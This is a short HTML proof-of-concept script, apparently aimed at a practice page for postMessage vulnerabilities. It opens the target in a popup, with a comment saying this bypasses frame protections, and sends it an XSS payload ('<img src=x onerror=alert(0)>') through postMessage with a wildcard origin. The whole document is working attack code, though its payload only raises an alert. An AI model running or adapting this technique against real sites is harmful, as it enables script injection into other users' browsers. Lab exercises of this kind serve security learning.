<script>
    // Popup instead of iframe (bypasses XFO/CSP frame protections)
    const popup = window.open("https://3nvz.github.io/postmessage-practice.html", "_blank");
  
    const payload = `
      <img src=x onerror=alert(0)>
    `;
  
    // Give it a second to load
    setTimeout(() => {
      popup.postMessage(payload, "*");
    }, 1000);
  </script>
